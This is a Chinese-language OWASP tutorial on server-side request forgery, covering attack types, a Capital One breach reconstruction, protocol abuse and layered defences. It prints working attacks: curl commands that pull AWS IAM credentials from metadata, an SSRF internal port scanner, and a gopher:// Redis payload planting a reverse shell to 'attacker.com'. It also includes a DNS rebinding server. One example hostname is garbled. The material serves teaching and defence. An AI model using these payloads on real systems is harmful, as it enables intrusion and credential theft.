A10:2021 - 服务端请求伪造 (Server-Side Request Forgery, SSRF)

HIGH 排名第10 2021年新增

SSRF 是 2021 年 OWASP Top 10 全新加入的漏洞类别。随着云原生架构普及、微服务内部通信增多，SSRF 的危害被急剧放大——攻击者可以利用服务端作为"跳板"，访问原本无法触及的内部网络资源。

为什么 SSRF 在云时代尤其危险？

云环境中，实例的元数据服务（如 AWS 的 169.254.169.254）暴露了 IAM 临时凭证、实例配置等敏感信息。一次 SSRF 就可能导致整个云账户被接管。2019 年 Capital One 数据泄露事件正是通过 SSRF 获取 AWS 临时凭证，最终导致 1 亿用户数据泄露。

1. SSRF 概述

1.1 什么是 SSRF？

SSRF（Server-Side Request Forgery，服务端请求伪造）是指攻击者能够诱使服务端应用向攻击者指定的任意地址发起请求。服务端充当了攻击者的"代理人"，代替攻击者发起网络请求。

SSRF 攻击模型： ┌─────────────┐ ┌─────────────────┐ ┌─────────────────┐ │ 攻击者 │────────→│ 目标Web服务器 │────────→│ 内部资源 │ │ (外部网络) │ HTTP │ (有漏洞的应用) │ SSRF │ (被防火墙保护) │ └─────────────┘ └─────────────────┘ └─────────────────┘ │ │ 正常流量：从外部无法访问内部资源 │ SSRF：借用服务器的"身份"访问内部资源 ▼ ┌───────────────────────────┐ │ 防火墙 / 网络边界 │ │ 对外部请求：拒绝 ✗ │ │ 对服务器请求：允许 ✓ │ └───────────────────────────┘ 关键点： - 攻击者自己无法直接访问内部网络 - 但服务器在内部网络中，拥有访问权限 - 攻击者利用服务器作为"跳板"来访问内部资源 - 服务器"被动"地替攻击者发起请求

1.2 SSRF 产生的根本原因

应用程序接受用户提供的 URL 或地址参数，并在服务端发起网络请求，但未对目标地址进行充分验证。常见场景包括：

功能场景正常用途如何被滥用
URL 预览/分享获取网页标题、缩略图将 URL 指向内部地址
文件下载/导入从远程 URL 下载文件下载内部文件或服务响应
Webhook 回调通知第三方系统回调地址指向内部服务
PDF 生成将 HTML 渲染为 PDFHTML 中引用内部资源
图片处理从 URL 加载图片缩放URL 指向内部 API
代理/转发功能API 聚合网关转发请求到内部服务
RSS/Feed 订阅拉取 RSS 内容订阅内部地址

1.3 真实案例：Capital One 2019

案例：Capital One 数据泄露（2019年7月）

影响：1 亿美国用户 + 600 万加拿大用户的个人信息泄露

罚款：8000 万美元

攻击链：

  1. 攻击者发现 Capital One WAF（ModSecurity）存在 SSRF 漏洞
  2. 通过 SSRF 访问 AWS 元数据服务 http://169.254.169.254/latest/meta-data/iam/security-credentials/
  3. 获取了 IAM Role 的临时 Access Key / Secret Key / Session Token
  4. 使用这些凭证访问 S3 存储桶，下载了大量客户数据

# Step 1: 攻击者发送精心构造的请求
curl -X POST https://capitalone-waf.example.com/ \
  -H "Host: 169.254.169.254" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role"

# Step 2: 服务器返回了 IAM 临时凭证
{
  "Code": "Success",
  "AccessKeyId": "ASIAXXX...",
  "SecretAccessKey": "wJalrXX...",
  "Token": "FwoGZXIvYXdzEBYaD...",
  "Expiration": "2019-03-XX"
}

# Step 3: 攻击者使用凭证列出 S3 桶
aws s3 ls --profile stolen-creds

# Step 4: 下载数据
aws s3 sync s3://capital-one-customer-data ./stolen/ --profile stolen-creds

2. SSRF 类型分类

2.1 基本 SSRF（Full SSRF / In-band SSRF）

服务器发起请求后，将响应内容直接返回给攻击者。攻击者可以完整读取内部服务的响应。

# 典型漏洞代码 (Python Flask)
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')
    # 未验证 URL，直接请求并返回内容
    response = requests.get(url)
    return response.text

# 正常使用
GET /fetch?url=https://example.com/api/data

# SSRF 攻击 - 读取内部服务
GET /fetch?url=http://192.168.1.100:8080/admin/users
# → 返回内部管理后台的用户列表！

# SSRF 攻击 - 读取云元数据
GET /fetch?url=http://169.254.169.254/latest/meta-data/
# → 返回 AWS 实例元数据！
Full SSRF 数据流： 攻击者 目标服务器 内部Redis │ │ │ │ GET /fetch?url= │ │ │ http://redis:6379/ │ │ │─────────────────────────→│ │ │ │ 连接 redis:6379 │ │ │──────────────────────────→│ │ │ │ │ │ 返回 Redis 信息 │ │ │←──────────────────────────│ │ │ │ │ HTTP 200 │ │ │ Body: Redis 响应内容 │ │ │←─────────────────────────│ │ │ │ │ 攻击者可以直接看到内部服务的响应内容 → 最危险的 SSRF 类型

2.2 Blind SSRF（盲 SSRF）

服务器发起请求，但不将响应内容返回给攻击者。攻击者无法直接看到内部服务的响应，需要通过间接方式探测。

# Blind SSRF 漏洞代码
@app.route('/webhook', methods=['POST'])
def set_webhook():
    url = request.json.get('callback_url')
    # 服务器会访问这个 URL，但不返回响应内容给用户
    try:
        requests.get(url, timeout=3)
        return jsonify({"status": "webhook registered"})
    except:
        return jsonify({"status": "webhook registered"})  # 无论成败都返回相同信息

# 攻击者无法看到响应内容，但可以：

# 方法1: 时间差探测
# 请求存在的内部服务 → 快速返回
# 请求不存在的服务 → 超时后返回
import time

ports = [22, 80, 443, 3306, 6379, 8080, 9200]
for port in ports:
    start = time.time()
    requests.post('http://target.com/webhook', json={
        'callback_url': f'http://192.168.1.1:{port}/'
    })
    elapsed = time.time() - start
    if elapsed < 1:  # 快速响应 = 端口开放
        print(f"[OPEN] Port {port}")
    else:            # 超时 = 端口关闭或被过滤
        print(f"[CLOSED/FILTERED] Port {port}")

# 方法2: DNS 外带（Out-of-Band）
# 让目标服务器解析攻击者控制的域名
callback_url = "http://ssrf-test.attacker-dns-server.com/"
# 如果攻击者的 DNS 服务器收到解析请求 → 确认 SSRF 存在

# 方法3: 利用 Burp Collaborator / interactsh
callback_url = "http://xyz123.burpcollaborator.net/"

2.3 Semi-blind SSRF（半盲 SSRF）

响应体不返回，但通过错误信息、状态码或响应时间泄露部分信息。

# 半盲 SSRF - 错误信息泄露
@app.route('/check-url')
def check_url():
    url = request.args.get('url')
    try:
        resp = requests.get(url, timeout=5)
        return jsonify({"reachable": True, "status_code": resp.status_code})
    except requests.exceptions.ConnectionError as e:
        return jsonify({"reachable": False, "error": str(e)})  # 泄露错误详情！
    except requests.exceptions.Timeout:
        return jsonify({"reachable": False, "error": "timeout"})

# 攻击者可以获取的信息：
# - status_code 泄露内部服务状态
# - 错误信息可能包含内部 IP、端口状态、Banner 信息

# 示例响应：
# GET /check-url?url=http://192.168.1.50:3306/
# → {"reachable": false, "error": "Connection refused"}  ← 端口关闭
#
# GET /check-url?url=http://192.168.1.50:6379/
# → {"reachable": true, "status_code": 200}  ← Redis 开放！
#
# GET /check-url?url=http://192.168.1.50:9200/
# → {"reachable": true, "status_code": 200}  ← Elasticsearch 开放！

2.4 SSRF 类型对比

类型响应可见性危害程度利用难度典型场景
Full SSRF完整响应返回极高低URL 预览、文件下载、代理功能
Semi-blind状态码/错误信息高中URL 校验、连通性检查
Blind SSRF完全不可见中高Webhook、异步回调、日志系统

3.2 场景二：内网端口扫描

通过 SSRF 对内部网络进行端口扫描，探测内部服务架构。

# 利用 SSRF 进行内网扫描（Python 自动化）
import requests
import time
import concurrent.futures

TARGET = "http://vulnerable-app.com/fetch"

def scan_port(ip, port):
    """利用 SSRF 扫描单个端口"""
    url = f"http://{ip}:{port}/"
    try:
        start = time.time()
        resp = requests.get(TARGET, params={'url': url}, timeout=10)
        elapsed = time.time() - start

        # 判断端口状态的方法
        if resp.status_code == 200 and len(resp.text) > 0:
            return (ip, port, "OPEN", resp.text[:100])
        elif elapsed > 5:
            return (ip, port, "FILTERED", "timeout")
        else:
            return (ip, port, "CLOSED", "")
    except:
        return (ip, port, "ERROR", "")

# 扫描常见内部服务端口
COMMON_PORTS = {
    22: "SSH",
    80: "HTTP",
    443: "HTTPS",
    3306: "MySQL",
    5432: "PostgreSQL",
    6379: "Redis",
    9200: "Elasticsearch",
    8080: "HTTP-Alt",
    8443: "HTTPS-Alt",
    27017: "MongoDB",
    11211: "Memcached",
    2379: "etcd",
    8500: "Consul",
    5601: "Kibana",
    9090: "Prometheus"
}

# 扫描 192.168.1.0/24 网段
results = []
with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    futures = []
    for ip_suffix in range(1, 255):
        ip = f"192.168.1.{ip_suffix}"
        for port in COMMON_PORTS:
            futures.append(executor.submit(scan_port, ip, port))

    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result[2] == "OPEN":
            print(f"[+] {result[0]}:{result[1]} ({COMMON_PORTS.get(result[1], '?')}) - OPEN")
            print(f"    Response: {result[3]}")
            results.append(result)

4. SSRF 协议利用方式

4.1 支持的协议概览

协议用途危害常见库支持
http:// / https://标准 Web 请求访问内部 Web 服务、API所有 HTTP 库
file://读取本地文件读取敏感配置、密钥文件cURL, Java URL, PHP
dict://字典服务协议探测端口、与 Redis 交互cURL, PHP
gopher://通用 TCP 协议构造任意 TCP 数据包cURL, PHP(旧版), Java
ftp://文件传输读取文件、端口扫描cURL, Java, PHP
ldap://目录服务信息泄露Java, PHP
tftp://简单文件传输向外传输数据cURL

4.2 dict:// 协议

# dict:// 协议可以向指定端口发送一行数据
# 格式: dict://host:port/command

# 探测 Redis
GET /fetch?url=dict://192.168.1.10:6379/INFO
→ 返回 Redis INFO 信息（版本、内存使用、连接数等）

# 获取 Redis 中的数据
GET /fetch?url=dict://192.168.1.10:6379/GET:secret_key

# 向 Redis 写入数据
GET /fetch?url=dict://192.168.1.10:6379/SET:pwned:true

# 局限性：dict:// 每次只能发送一行命令
# 无法执行需要多行的复杂操作

4.3 gopher:// 协议（SSRF 核武器）

gopher:// — 最强大的 SSRF 协议

gopher:// 协议允许构造任意 TCP 数据包，可以模拟几乎任何基于 TCP 的协议通信。这使得攻击者可以通过 SSRF 与 Redis、MySQL、SMTP、FastCGI 等服务进行完整交互。

# gopher:// 协议格式
# gopher://host:port/_[TCP数据流(URL编码)]

# === 利用 gopher:// 攻击 Redis ===

# 目标：通过 Redis 写入 Crontab 获取反弹 Shell

# 原始 Redis 命令：
# FLUSHALL
# SET mykey "\n\n*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1\n\n"
# CONFIG SET dir /var/spool/cron/
# CONFIG SET dbfilename root
# SAVE
# QUIT

# 转换为 gopher 载荷（每行末尾加 \r\n，整体 URL 编码）：
gopher://192.168.1.10:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%245%0D%0Amykey%0D%0A%2461%0D%0A%0A%0A%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A%2Fvar%2Fspool%2Fcron%2F%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A%2A1%0D%0A%244%0D%0AQUIT%0D%0A

5.2 DNS Rebinding 攻击

DNS Rebinding 原理

当应用先解析域名验证 IP 是否合法，再用该域名发起请求时，攻击者可以利用 DNS TTL 极短的特性：第一次解析返回合法 IP（通过验证），第二次解析返回内网 IP（实际请求）。

DNS Rebinding 攻击流程： 应用的验证逻辑： 1. 接收用户输入的URL: http://evil.attacker.com/path 2. DNS解析 evil.attacker.com → 得到IP 3. 检查IP是否为内网地址？ 不是 → 放行 4. 发起实际HTTP请求到 evil.attacker.com 攻击者的 DNS 服务器配置： evil.attacker.com TTL=0 第1次查询 → 返回 8.8.8.8 (合法外网IP，通过验证) 第2次查询 → 返回 169.254.169.254 (内网元数据！) 时间线： t=0 应用收到 URL: http://evil.attacker.com/meta t=1 DNS查询 #1 → 8.8.8.8 (外网，合法) ✓ 通过验证 t=2 DNS缓存过期 (TTL=0) t=3 发起HTTP请求，DNS查询 #2 → 169.254.169.254 t=4 实际连接到 169.254.169.254 → 获取元数据！ 关键条件： - DNS TTL 设为 0 或极短 - 应用在验证和请求之间有时间差 - 应用不缓存DNS结果或缓存时间极短
# DNS Rebinding 工具和服务

# 1. 使用 rbndr.us 服务
# 格式: [IP1].[IP2].rbndr.us → 交替返回两个IP
http://7f000001.a]9fea9fe.rbndr.us/
# 交替解析为 127.0.0.1 和 169.254.169.254

# 2. 使用 Singularity of Origin 工具
# https://github.com/nccgroup/singularity
# 自建DNS rebinding服务器

# 3. 自建 DNS 服务器 (Python)
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, A, QTYPE
import threading

class RebindResolver(BaseResolver):
    def __init__(self):
        self.counter = {}

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        reply = request.reply()

        if qname not in self.counter:
            self.counter[qname] = 0

        self.counter[qname] += 1

        if self.counter[qname] % 2 == 1:
            # 第一次：返回合法IP
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("8.8.8.8"), ttl=0))
        else:
            # 第二次：返回内网IP
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("169.254.169.254"), ttl=0))

        return reply

resolver = RebindResolver()
server = DNSServer(resolver, port=53, address="0.0.0.0")
server.start()

6. 防御方案

SSRF 防御核心思想

防御 SSRF 需要多层防御（Defense in Depth）：应用层验证 + 网络层隔离 + 云平台加固，缺一不可。单靠任何一层都可能被绕过。

6.1 应用层：输入验证

# ✅ 方案1：白名单验证（最推荐）
import ipaddress
from urllib.parse import urlparse
import socket

# 定义允许的域名白名单
ALLOWED_DOMAINS = {
    'api.example.com',
    'cdn.example.com',
    'images.example.com'
}

# 定义禁止的 IP 范围（内网 + 特殊地址）
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),  # Link-local (元数据!)
    ipaddress.ip_network('100.100.100.0/24'),  # 阿里云元数据
    ipaddress.ip_network('0.0.0.0/8'),
    ipaddress.ip_network('::1/128'),          # IPv6 localhost
    ipaddress.ip_network('fc00::/7'),         # IPv6 ULA
    ipaddress.ip_network('fe80::/10'),        # IPv6 Link-local
]

def is_safe_url(url: str) -> bool:
    """综合验证 URL 是否安全"""
    try:
        parsed = urlparse(url)

        # 1. 协议白名单
        if parsed.scheme not in ('http', 'https'):
            return False

        # 2. 域名白名单（如果使用白名单策略）
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False

        # 3. 解析域名得到 IP，检查 IP 是否在禁止范围
        # 重要：必须解析后检查，防止 DNS Rebinding 等绕过
        ip_addr = socket.getaddrinfo(parsed.hostname, parsed.port or 443)[0][4][0]
        ip = ipaddress.ip_address(ip_addr)

        for network in BLOCKED_NETWORKS:
            if ip in network:
                return False

        # 4. 端口白名单
        allowed_ports = {80, 443}
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        if port not in allowed_ports:
            return False

        return True

    except (ValueError, socket.gaierror, OSError):
        return False

# 使用示例
@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')

    if not is_safe_url(url):
        return jsonify({"error": "URL not allowed"}), 403

    # 关键：使用解析后的 IP 直接发起请求（防止 DNS Rebinding）
    parsed = urlparse(url)
    ip_addr = socket.getaddrinfo(parsed.hostname, None)[0][4][0]
    # 用 IP 替换域名发起请求，避免二次 DNS 解析
    safe_url = url.replace(parsed.hostname, ip_addr)
    response = requests.get(safe_url, headers={'Host': parsed.hostname},
                           allow_redirects=False,  # 禁止跟随重定向！
                           timeout=5)
    return response.text

6.2 应用层：禁止重定向跟随

# ✅ 禁止 HTTP 客户端自动跟随重定向
# 如果必须跟随重定向，则每次重定向都要重新验证目标

import requests

def safe_fetch(url: str, max_redirects: int = 3) -> requests.Response:
    """安全的 URL 获取，手动处理重定向"""
    for i in range(max_redirects + 1):
        if not is_safe_url(url):
            raise ValueError(f"Redirect to blocked URL: {url}")

        resp = requests.get(url, allow_redirects=False, timeout=5)

        if resp.status_code in (301, 302, 303, 307, 308):
            url = resp.headers.get('Location', '')
            if not url:
                raise ValueError("Empty redirect location")
            continue
        else:
            return resp

    raise ValueError("Too many redirects")

6.5 云平台：IMDSv2 加固

IMDSv2：AWS 元数据服务的重大安全升级

AWS Instance Metadata Service v2 (IMDSv2) 要求使用 PUT 请求获取 Session Token，然后在后续请求中携带该 Token。由于大多数 SSRF 只能发起 GET 请求，IMDSv2 能有效防御通过 SSRF 窃取元数据凭证。

# === IMDSv1（不安全，已被 SSRF 多次利用） ===
# 简单 GET 请求即可获取元数据
curl http://169.254.169.254/latest/meta-data/
# → 直接返回元数据，无需任何认证

# === IMDSv2（安全） ===
# Step 1: 必须先用 PUT 请求获取 Token
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: 使用 Token 获取元数据
curl http://169.254.169.254/latest/meta-data/ \
  -H "X-aws-ec2-metadata-token: $TOKEN"

# 为什么 IMDSv2 能防御 SSRF：
# 1. 大多数 SSRF 只能发起 GET 请求（无法发 PUT）
# 2. 即使能发 PUT，也需要设置自定义 Header
# 3. gopher:// 虽然可以构造 PUT，但 Token 有 TTL，需要两步操作
# 4. 即使 Token 泄露，也有 hop limit = 1（不允许从容器/转发获取）

# === 强制使用 IMDSv2（AWS CLI/Terraform） ===
# AWS CLI
aws ec2 modify-instance-metadata-options \
  --instance-id i-1234567890abcdef0 \
  --http-tokens required \           # 强制使用 IMDSv2
  --http-put-response-hop-limit 1 \  # 限制 Token 传播
  --http-endpoint enabled

# Terraform
resource "aws_instance" "web" {
  # ...
  metadata_options {
    http_endpoint               = "enabled"
    http_tokens                 = "required"  # 强制 IMDSv2
    http_put_response_hop_limit = 1
  }
}

# GCP 等效措施：要求 Metadata-Flavor: Google Header
# Azure 等效措施：要求 Metadata: true Header
# 这些 Header 要求也能阻止大部分基本 SSRF（无法设置自定义 Header）

class SSRFProtector:
    """SSRF 防护类"""

    # 私有/保留 IP 范围
    BLOCKED_NETWORKS = [
        ipaddress.ip_network('0.0.0.0/8'),
        ipaddress.ip_network('10.0.0.0/8'),
        ipaddress.ip_network('100.64.0.0/10'),   # Carrier-grade NAT
        ipaddress.ip_network('127.0.0.0/8'),
        ipaddress.ip_network('169.254.0.0/16'),  # Link-local / 云元数据
        ipaddress.ip_network('172.16.0.0/12'),
        ipaddress.ip_network('192.0.0.0/24'),
        ipaddress.ip_network('192.168.0.0/16'),
        ipaddress.ip_network('198.18.0.0/15'),   # Benchmark
        ipaddress.ip_network('224.0.0.0/4'),     # Multicast
        ipaddress.ip_network('240.0.0.0/4'),     # Reserved
        ipaddress.ip_network('255.255.255.255/32'),
        # IPv6
        ipaddress.ip_network('::1/128'),
        ipaddress.ip_network('fc00::/7'),        # Unique local
        ipaddress.ip_network('fe80::/10'),       # Link-local
        ipaddress.ip_network('::ffff:0:0/96'),   # IPv4-mapped
    ]

    ALLOWED_SCHEMES = {'http', 'https'}
    ALLOWED_PORTS = {80, 443, 8080, 8443}
    MAX_REDIRECTS = 5
    TIMEOUT = 10

    def __init__(self, allowed_domains: Optional[set] = None):
        self.allowed_domains = allowed_domains
        self.session = requests.Session()
        self.session.max_redirects = 0  # 手动处理重定向

    def _is_private_ip(self, ip_str: str) -> bool:
        """检查 IP 是否在私有/保留范围"""
        try:
            ip = ipaddress.ip_address(ip_str)
            return any(ip in network for network in self.BLOCKED_NETWORKS)
        except ValueError:
            return True  # 无法解析则默认拒绝

    def _resolve_hostname(self, hostname: str) -> str:
        """解析域名并验证结果 IP"""
        try:
            # 使用 getaddrinfo 解析（支持 IPv4/IPv6）
            results = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC)
            if not results:
                raise ValueError(f"Cannot resolve: {hostname}")

            ip_str = results[0][4][0]

            if self._is_private_ip(ip_str):
                raise ValueError(
                    f"Hostname {hostname} resolves to private IP: {ip_str}"
                )

            return ip_str
        except socket.gaierror:
            raise ValueError(f"DNS resolution failed: {hostname}")

    def validate_url(self, url: str) -> Tuple[str, str]:
        """
        验证 URL 安全性
        返回: (validated_url, resolved_ip)
        """
        # 1. 基本 URL 解析
        try:
            parsed = urlparse(url)
        except Exception:
            raise ValueError("Invalid URL format")

        # 2. 协议验证
        if parsed.scheme.lower() not in self.ALLOWED_SCHEMES:
            raise ValueError(f"Blocked scheme: {parsed.scheme}")

        # 3. 主机名验证
        hostname = parsed.hostname
        if not hostname:
            raise ValueError("Missing hostname")

        # 4. 域名白名单（如果配置了）
        if self.allowed_domains and hostname not in self.allowed_domains:
            raise ValueError(f"Domain not in allowlist: {hostname}")

        # 5. 端口验证
        port = parsed.port
        if port and port not in self.ALLOWED_PORTS:
            raise ValueError(f"Blocked port: {port}")

        # 6. DNS 解析 + IP 验证（防止 DNS Rebinding 的第一步）
        resolved_ip = self._resolve_hostname(hostname)

        # 7. 检查是否是 IP 直接输入（额外验证各种进制表示）
        # 尝试把 hostname 直接解析为 IP
        try:
            direct_ip = ipaddress.ip_address(hostname)
            if self._is_private_ip(str(direct_ip)):
                raise ValueError(f"Direct private IP not allowed: {hostname}")
        except ValueError:
            pass  # 不是直接 IP，是域名，已经在上面验证过了

        return (url, resolved_ip)

    def safe_request(self, url: str, method: str = 'GET',
                     **kwargs) -> requests.Response:
        """
        安全地发起 HTTP 请求
        自动处理重定向验证
        """
        redirects = 0

        while redirects <= self.MAX_REDIRECTS:
            # 每次请求前都验证 URL
            validated_url, resolved_ip = self.validate_url(url)

            # 使用解析后的 IP 发起请求（防止 DNS Rebinding）
            parsed = urlparse(validated_url)
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)

            # 替换 hostname 为 IP，设置 Host header
            actual_url = validated_url.replace(
                parsed.hostname, resolved_ip
            )

            headers = kwargs.pop('headers', {})
            headers['Host'] = parsed.hostname

            resp = self.session.request(
                method, actual_url,
                headers=headers,
                allow_redirects=False,
                timeout=self.TIMEOUT,
                verify=True,
                **kwargs
            )

            # 处理重定向
            if resp.status_code in (301, 302, 303, 307, 308):
                redirects += 1
                location = resp.headers.get('Location', '')
                if not location:
                    raise ValueError("Empty redirect location")
                # 处理相对 URL
                url = urljoin(validated_url, location)
                continue

            return resp

        raise ValueError("Too many redirects")


# === 使用示例 ===
protector = SSRFProtector(
    allowed_domains={'api.github.com', 'cdn.example.com'}
)

@app.route('/proxy')
def proxy_request():
    url = request.args.get('url')
    try:
        resp = protector.safe_request(url)
        return resp.text, resp.status_code
    except ValueError as e:
        return jsonify({"error": str(e)}), 403

6.7 防御检查清单

层面措施防御的攻击优先级
应用层URL 白名单（允许的域名/IP）所有 SSRFP0
应用层禁用 file://, dict://, gopher:// 等协议协议滥用P0
应用层DNS 解析后验证 IP + 用 IP 发请求DNS RebindingP0
应用层禁止/手动处理 HTTP 重定向Open Redirect 链P1
应用层统一 URL 解析库解析不一致绕过P1
应用层响应内容过滤（不返回原始响应）信息泄露P2
网络层出站流量防火墙（Egress filtering）内网访问P0
网络层网络分段（微服务间 ACL）横向移动P1
网络层服务间 mTLS 认证未授权内部访问P1
云平台启用 IMDSv2（AWS）/ 等效方案元数据窃取P0
云平台最小权限 IAM Role凭证滥用范围P0
云平台VPC Endpoint 限制非预期服务访问P2
监控记录所有出站请求日志事后追溯P1
监控异常出站连接告警实时检测P1
常见防御误区
  • ❌ 只用黑名单过滤 IP — 可通过进制转换、DNS Rebinding 等轻易绕过
  • ❌ 只验证域名不验证解析后 IP — 攻击者控制的域名可以指向任何 IP
  • ❌ 验证后重新解析域名发请求 — DNS Rebinding 的经典利用场景
  • ❌ 只禁用 http/https 以外协议但不限制目标 — HTTP 本身就能访问内网
  • ❌ 依赖正则表达式验证 URL — URL 解析极其复杂，正则必然有遗漏
  • ❌ 允许 HTTP 重定向跟随但不验证重定向目标 — Open Redirect 绕过
